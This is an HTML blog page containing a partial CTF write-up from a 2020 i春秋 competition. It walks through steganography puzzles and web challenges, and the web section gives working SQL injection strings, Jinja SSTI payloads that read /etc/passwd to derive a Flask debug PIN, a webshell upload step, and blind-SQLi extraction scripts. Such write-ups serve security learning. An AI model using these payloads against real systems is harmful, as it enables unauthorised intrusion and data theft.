@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>I春秋公益赛部分Writeup | 过客</title>
+<meta name="description" content="this is a test Web">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://guokeya.github.io/favicon.ico?v=1582521823154">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://guokeya.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://guokeya.github.io">
+        <img src="https://guokeya.github.io/images/avatar.png?v=1582521823154" class="site-logo">
+        <h1 class="site-title">过客</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            分类
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      this is a test Web
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://guokeya.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">I春秋公益赛部分Writeup</h2>
+            <div class="post-date">2020-02-23</div>
+            
+            <div class="post-content">
+              <p>太菜了。只能纪录下自己做出来的题<br>
+<strong><center>MISC</center></strong><br>
+1。code_in_morse<br>
+题目给了个数据包。拿到数据包首先就是看HTTP<br>
+<img src="https://guokeya.github.io/post-images/1582507063277.png" alt="" loading="lazy"></p>
+<!-- more -->
+<p>可以看到。上传了一个image。尝试看看image图片。一般图片都会藏点什么东西。<br>
+摩斯密码。<br>
+<img src="https://guokeya.github.io/post-images/1582507137401.png" alt="" loading="lazy"><br>
+拿去解密<br>
+<img src="https://guokeya.github.io/post-images/1582507269755.png" alt="" loading="lazy"><br>
+这里有个坑。不同网站解出来的东西不一样。用CTFCrak需要将最后的NULLNULLNULL，替换===<br>
+===结尾。尝试下base32解密</p>
+<pre><code>import base64
+data='RFIE4RYNBINAUAAAAAGUSSCEKIAAAAEUAAAAA7AIAYAAAAEPFOMTWAAABANUSRCBKR4F53M52F3NWOAMIQ37776R5GE6YNAWJPUA4ZBZM6M5ZPRVWIURUHGMBRAMU7T3P57X776PP5DOBIQIXQE2RCZC5EYFWBAESRALQNACALVNE4B2TCABEA4XIZQAVKFXW632O3XS5HZT7R2J747545E4Y7K6HJA7WI5Y62W4OH7HJ75RL2VOMUMN2OOXOWU7RXV7U6D7AFC2X6TBGSDQII3ABOUCCARS2Q7CAATKD2HRTI6JKAZNIXYGK3ZO4POZENG566RDQVSAKWF26VLJJPC5VD2FAATKAMCHTP27Y5IKTWNNAKLVNEPUXLH6XVICOQMXGHEPDBYZYXZ2R6KKTU7ZF7X2CBGUXSOSHICOPIPQCJNAT3JO5ND5OHLBW5BF4CWNI5BFKTERWIUWFZYKVVKURWS7PI4FEXURAUFXBD6JQKSPZFJ7EXRCPEUSHJMS7GVKVDOG7W6F4ZL4XILUVCKWGFZ3KV2I5WBR7R2QALVHNSEWCKDCIXCA3VJU2QAJVCUZSO3LZICZJAASKAD2LKQ6BLVPQLUDSDLFPZP2WOTPLVLNABG7SPICMT3K52QLTWK3Y4NBXIMX5NRKJIA5FLO6Y3LVP55BPDITRVN2UYEZ33ERFZ2R4KTFVJVECKKRXKA2LRCKQFHEAIEAKZWYCKXRXLGJYJXQKZ445HWLUPAFGIC7FV46SB5MERIYNWSHUCNUQP5OB4S2BDQ7627HULZQRW3QYNKQKU3VHCNJSU6E36IUEPU2TBGKZOSB22N2R6TPY7XUG32VIXLTHGHJXGWNWMTJOGFMAJHOVWIIGDSG2KOONGK7UDFQS4ZOK2OAXKAXWZRTOTZQ2Q7CKRKRWAK6IAK2SRYLT72DGHQXRJGGDN57EJBZ2M7VJHOGJKEHU5ASU2KKTFB4SW5MB5C4YR4SSKNON3XLSS6K7CGJKAZNIP6E7RVUY6OFIBTTXYREMWKWPIDKRPTJSMRJPUXKUOWT5IZP3HEJ65OYVILIUGUI2QHGH32VAAXKO23H2BTIAF2UF4QESSANVEKPILOY63ZA5GUZRLLCIQSY6IRWLSTWULC5KBRAFOQPPEED3VB6IKKDRSN2FF4UVXS7KT6TUQCRQZ2DXZS5AYOCLLHKK6I2JUPRSK2HVI3YKBTZXWQDNGI3FMYHFMO3BIYABKUPTFSK3J4KKPKNALUMP5NFERHUB3I7IWTXQEAAMQUPQGRADFFIMKQ3MQNX3BW7NU4WMITZDB5D3FP3VHD2SPCX65ZVL44VUHQMAHMZLQFKADBFIO2RRKTCDYZJ2BCENKZ2LY2TIKSH3MMU3EUB5T26E4TP4NK3F6KRSTI3TEKTBKXTJYKHQATMWUDXT5T4CUYXK6U5H2LYAKUO5LJIFS2QY4O7KZP3KBCODRBAGLKPDN5WUTLOAKEOJP22CBGU6GXYJUPRTXXHKJLP7D46I2TPFLWQRJ4NIEFDYSNKDYFCERFHAC5NIWXVQXELIUSGKLKZLGT36JMOS7IIPBU76KXNQDJV4ZSXCE7F5P4U4QIRAKPAWRQFJLVHRFJDKIVLAVFOORM7F5S3U5D6AIFDV27JYJ243PIM6UKVSGLKQIZACNKPHVJAQJNPUAWACJNAWYEJBR2Q6LTA3STOLSLO6QZFKQ5QGFEZ5TKCJJ6VKBVNVO7DKG27T3HHJDRVXTPD6H7EW6FI6QB5GHQVKU3VP54TBBQMIDFJ6QFKRZXP4UE2QG3EVJDK3AASKBCE5W3VDHVB4JVC7IXOG5C7J4MZWSRDJFSHKH626LIUGRPZ6T2SEANVP5KDXFNKGQIWQS5J5MC5HBH5GGTHZLGWXKOWSCRQNULFGO4C3ZHUZF6O57K4YV2VYUR5BF3PDMEKR7JZEZJAAEUUORJ32GSHIAG4OWQS5LPPKVU2J7P5AQUQWRK7HE5BX3UWXJNPSKKBICC5Z5Y5L7AESSANUYPUNR2USESHE2ORQMJ5H6KTB6YSTVZD3FA6NLBUASWRM6VZYTXV6E4J6SW2XLZ6RGW7JL5FECJ53N7KRKRXMJGKVJTH6FNIFIOOA26AFHEAXJCUAQGBON2UPZNMBRKW7ZKUDZFYMCQBE5B4SUCTJ6TIOOT6J2XVXXLVRMPT3VGQUCSIAU4DKFJ7535XXUWGDSV3DJHQ2SXK3PILDELUPQVAVKFKJQM2GO47WTXXIZQPKNAE2VSDIDGT2VSSNUFSQAJV7WEY2WKVFSQANMFERVARSSUGEJ7TZLISVGYVPGPSVZTRTRYZXVI6VNNIZ6LFNPL2VAQVECPVZYLF3BR2M2PCXAF5USD6UVR7STM27OSOM7D3XUU2RZD5KWOKSBKIKLW3Q6VCIJTFVJLQDBREGECQBDKTJETLKU5KYQJVABNCATKD4MCVP6G75HT2V4CPQSW64SMM2VIBS2Q65ENEIBIETVJ5MFEFVLPEZXG3JEXX4QXSSUAABGMN67M5CJJVGTWUOS7742UGJK6VG2TGVFVCIYCUE2L44E2VBFJHTFNT7URWE6HSIZ2PF5TR7QST3FEAXIWSCMJO4V74VEACNKEGJF3B2IDGRF3BRAYWTALFVCFR7IZCNGVDEUSAZURUGABG5H6TDDKNEVH4TWZC2DI6FR6XT6W64SDC2JY3WDEXTLOK4ZBKPEXZMPFC4RFCFU5KQ6AEDV6T2MGAJ7HUQQUXSPY2U6VFNR3YDVWWKLK54UE2RPPUBGUJHDZ5SGMUY563JFZIRAPIXIGHLD2Q5IMUQOWIGOS2OADI4FPZ3GPJHQV2BU74SW6AUSPXX57VPJ24ZFJ7FNQIURSX6KQZGLKPDN5TLRKZZEGEN6K7T65EHP2X7E54M4AZQVRPFHRVDOZBLVAJFSHUPIVMTKKFUF4C2X7FBGUNWESTWFYXM37PZIBXQMWUERWUSQTFVD65OZR7YZBUACNIP46K3EQXWY5SUSIYGESUH3NLI6FI6DAFNUHQD5KLADK23QWSXWV4UE2RTF6HNMZWTVLVVZMN6NGKXOPO7AKI7ZO2AYBGV7YFMMCAQKQ65D6VINJOPMPKVO3XS73ICKETFERWLKCFX5YEYQA566QZJPETH7AKRZBJPENQNUWN4K2DYTNLWDKPY2WKGMDCIC5QRQUSO42ZPETOUO3VHUIJSVHSN3UXZ2B6OR6ZYB2J4KX5W6QRKB5QMEKQQVTTVO2LJYMULY2WDFFQWROXMWUELDVPZBIDFVAWQFLR6AJ6POOEHBW2U4UDC7S2FRU4VC47P3WQJ4BROGKLYQXSVIHLE7ZXAIKID2LZFB5JHV4NIAKQCAJFGYXI3AEAXI2JYDRGUDCMBJIR7ABXO3NF6UIUKCLNAAAAAACJIVHEJLSCMCBA===='
+print (base64.b32decode(data))
+</code></pre>
+<p>得到一张PDF417的码<br>
+<code>https://demo.dynamsoft.com/DBR/BarcodeReaderDemo.aspx</code><br>
+得到一个base64加密的字符串<br>
+<img src="https://guokeya.github.io/post-images/1582508974936.png" alt="" loading="lazy"><br>
+解密后是个URL。是一张图。保存后查看详细信息。发现F5提示<br>
+<img src="https://guokeya.github.io/post-images/1582509061392.png" alt="" loading="lazy"><br>
+F5隐写得到flag<br>
+<img src="https://guokeya.github.io/post-images/1582509099377.png" alt="" loading="lazy"><br>
+2。套娃<br>
+第一关。发现ook。解码获得压缩密码。<br>
+同时在1.连环画中发现part1<br>
+<img src="https://guokeya.github.io/post-images/1582509312028.png" alt="" loading="lazy"><br>
+第二关。爆破得到压缩包密码3302<br>
+同时在2.连环画详细信息中发现part2<br>
+<img src="https://guokeya.github.io/post-images/1582509491997.png" alt="" loading="lazy"><br>
+第三关。通过txt得到虚张声势。猜测zip伪加密<br>
+同时通过stegsolve发现part3<br>
+<img src="https://guokeya.github.io/post-images/1582509621858.png" alt="" loading="lazy"><br>
+第四关。通过4.hint.png知道这是zip明文攻击<br>
+将4.jpg和5.zip打包。进行明文攻击。(又是坑，明文攻击刚开始不能退出。跑了半个小时。可以退出了。并且会生成一个解密的压缩包)<br>
+<img src="https://guokeya.github.io/post-images/1582509875778.png" alt="" loading="lazy"><br>
+修改图片长度。得到part4<br>
+<img src="https://guokeya.github.io/post-images/1582509960998.png" alt="" loading="lazy"><br>
+第五关。猪圈密码。得到解压密码fojiajielv<br>
+并且给了81张图。慢慢拼图吧🙄<br>
+<img src="https://guokeya.github.io/post-images/1582510831489.png" alt="" loading="lazy"><br>
+第六关。与佛论禅解压得到密码amtf12345<br>
+图片末尾发现摩斯密码<br>
+<img src="https://guokeya.github.io/post-images/1582510976815.png" alt="" loading="lazy"><br>
+第七关。银河密码。yinhezm<br>
+时间隐写。将10-&gt;0，20-&gt;1得到part7:61562<br>
+<img src="https://guokeya.github.io/post-images/1582511218402.png" alt="" loading="lazy"><br>
+第八关：</p>
+<pre><code>8.原来，真经就在塔顶，走到顶，两位存储尊者向你索要人事一些&lt;既然出门匆忙没带经文 不如把一路上得到的战利品(共32位)交出来吧
+</code></pre>
+<p>总结前面的所有part。解压<br>
+最后是ntfs隐写。貌似用winrar解压数据不会丢失。这步全是在虚拟机里运行的。拖到本机数据就没了。<br>
+<img src="https://guokeya.github.io/post-images/1582511658818.png" alt="" loading="lazy"><br>
+3。funnygame<br>
+给了pygame文件。修改了雷的数量。玩了一下没啥结果。。<br>
+去图标库看看。扫雷.png特别显眼。其他都是bmp。<br>
+<img src="https://guokeya.github.io/post-images/1582511841458.png" alt="" loading="lazy"><br>
+拖到kali下binwalk分离<br>
+得到一个openssl加密的文件<br>
+<img src="https://guokeya.github.io/post-images/1582511909677.png" alt="" loading="lazy"><br>
+那么接下来就只有爆破or找密钥<br>
+结束后师傅们说。是pyc隐写。。。新姿势get<br>
+<img src="https://guokeya.github.io/post-images/1582512221581.png" alt="" loading="lazy"><br>
+得到密钥<br>
+<code>https://www.sojson.com/encrypt_aes.html</code><br>
+解压后得到16进制</p>
+<pre><code>f=open('secret.txt','r')
+data=f.read()
+f.close()
+d=''
+for i in range(0,len(data),2):
+    d+=chr(int('0x'+data[i:i+2],16))
+print d
+</code></pre>
+<p>python exp.py&gt;1.txt<br>
+发现文件16进制是倒着的</p>
+<pre><code>f=open('1.txt','r')
+data=f.read()
+f.close()
+data2=data[::-1]
+print data2
+</code></pre>
+<p>得到flag.wav最后。就是考听力了。告辞😭<br>
+<strong><center>Web</center></strong><br>
+<strong>简单的招聘系统</strong><br>
+在登陆出发现admin' or 1=1%23可以登陆为admin。猜测这里有注入<br>
+<img src="https://guokeya.github.io/post-images/1582513974012.png" alt="" loading="lazy"><br>
+判断字段数。6的时候报错。说明字段数为5<br>
+登陆后。会在用户信息回显<br>
+<img src="https://guokeya.github.io/post-images/1582514046115.png" alt="" loading="lazy"><br>
+没过滤。送分题。还有一种解法，通过or 1=1登陆后。在admin查询页面。注入<br>
+<strong>easysqli_copy</strong><br>
+<img src="https://guokeya.github.io/post-images/1582514119329.png" alt="" loading="lazy"><br>
+首先分析下代码<br>
+通过id传参。如果没有传参。就从数据库中取值作为默认<br>
+id传参需要过正则匹配。数据库编码为UTF-8。然后用预处理带入sql语句<br>
+<code>https://www.freebuf.com/articles/web/216336.html</code><br>
+UTF-8想起宽字节注入可以逃逸单引号。然后用%00注释<br>
+用堆叠注入hex编码绕过。随便注<br>
+<img src="https://guokeya.github.io/post-images/1582514494044.png" alt="" loading="lazy"><br>
+<strong>Blacklist</strong><br>
+原题是强网杯的随便注<br>
+原本的思路是动过堆叠注入。更改表名或者利用prepare去读取数据<br>
+但这题新增了一个黑名单。限制了以上两种操作使用的函数<br>
+一直没啥思路。知识面太窄了😅<br>
+结束后。大佬们用handler来代替select查询<br>
+handler使用方法：<code>https://dev.mysql.com/doc/refman/8.0/en/handler.html</code></p>
+<pre><code>HANDLER tbl_name OPEN [ [AS] alias]
+
+HANDLER tbl_name READ index_name { = | &lt;= | &gt;= | &lt; | &gt; } (value1,value2,...)
+    [ WHERE where_condition ] [LIMIT ... ]
+HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }
+    [ WHERE where_condition ] [LIMIT ... ]
+HANDLER tbl_name READ { FIRST | NEXT }
+    [ WHERE where_condition ] [LIMIT ... ]
+
+HANDLER tbl_name CLOSE
+</code></pre>
+<p>handler 表名 open   可选参数：as别名<br>
+#打开表返回一个句柄<br>
+handler 表名 read first<br>
+#读取第一条数据<br>
+handler 表名 close<br>
+#关闭句柄<br>
+<img src="https://guokeya.github.io/post-images/1582425638810.png" alt="" loading="lazy"></p>
+<p>首先查看表名得到FlagHere<br>
+<img src="https://guokeya.github.io/post-images/1582425889129.png" alt="" loading="lazy"><br>
+得到列名flag<br>
+<img src="https://guokeya.github.io/post-images/1582425927117.png" alt="" loading="lazy"><br>
+得到flag<br>
+<img src="https://guokeya.github.io/post-images/1582425989391.png" alt="" loading="lazy"><br>
+<strong>ezupload</strong><br>
+这题没什么好说的。直接上传一句话木马。执行/readflag得到flag<br>
+<strong>盲注</strong><br>
+由于已知字段。并且在同表。那就不需要select<br>
+<img src="https://guokeya.github.io/post-images/1582515117678.png" alt="" loading="lazy"><br>
+regexp判断即可<br>
+<strong>Flaskapp</strong><br>
+在解密处存在SSTI。将<code>{{1+1}}</code>base64编码后发送。返回<code>{{2}}</code><br>
+随便输入个字符。存在报错。并且hint页面提示PIN。<br>
+之前看到过一篇文章。利用SSTI构造PIN码。执行任意代码<br>
+<code>https://www.anquanke.com/post/id/197602</code><br>
+以下是我的payload：</p>
+<pre><code>[].__class__.__base__.__subclasses__()[134].__init__.__globals__['__builtins__']['open']('/etc/passwd','r').read()
+
+{% for c in [].__class__.__base__.__subclasses__() %}
+{% if c.__name__=='catch_warnings' %}
+{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}
+{% endif %}{% endfor %}
+</code></pre>
+<p>1：读取/sys/class/net/eth0/address<br>
+2：如果存在/proc/self/cgroup文件。那么/etc/machine-id会取/proc/self/cgroup的第一行<br>
+3：读取/etc/passwd得到用户名<br>
+4：debug报错得到app路径<br>
+<img src="https://guokeya.github.io/post-images/1582515443898.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1582516025637.png" alt="" loading="lazy"><br>
+<strong>ezsqli</strong><br>
+这道题考的是高版本mysql的特性。比如新增了数据库。可以用于绕过information被过滤<br>
+最后字符串比较。拿flag<br>
+不多说了。直接上脚本</p>
+<pre><code>slist='uabcdefghijkmnlopqrstvwxyzABCDEFGHIJKMNLOPQRSTUVWXYZ[](),{}_1234567890-'
+import requests
+for i in range(1,60):
+    for a in slist:
+        payload='0^(ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer),'+str(i)+',1))='+str(ord(a))+')'
+        data={&quot;id&quot;:payload}
+        r=requests.post(url='http://b539562b497746f9b3a26355ea0835a8400621d5d6294eff.changame.ichunqiu.com/index.php',data=data)
+        if 'Nu1L' in r.text:
+            print (a)
+            break
+</code></pre>
+<p>通过sys这个库。跑出表名f1ag_1s_h3r3_hhhhh<br>
+然后通过字符串比较。获得flag</p>
+<pre><code>import requests
+flag=''
+url='http://b539562b497746f9b3a26355ea0835a8400621d5d6294eff.changame.ichunqiu.com/index.php'
+for i in range(100):
+    for a in range(40,130):
+        payload='((select 1,0x'+flag+hex(a).replace('0x','')+')&lt;(select * from f1ag_1s_h3r3_hhhhh))'
+        data={&quot;id&quot;:payload}
+        r=requests.post(url=url,data=data)
+        if 'Nu1L' not in (r.text):
+            print (chr(a-1))
+            flag+=hex(a-1).replace('0x','')
+            break
+</code></pre>
+<p>这里字符串比较。不区分大小写。<br>
+如果区分大小写。可以用binary具体检测。这题过滤了in。就不行了。<br>
+<img src="https://guokeya.github.io/post-images/1582521792220.png" alt="" loading="lazy"></p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://guokeya.github.io/tag/CTF/" class="tag">
+                    CTF
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://guokeya.github.io/post/ctfshow-hong-bao-ti-di-ba-dan/">
+                  <h3 class="post-title">
+                    ctfshow红包题第八弹
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
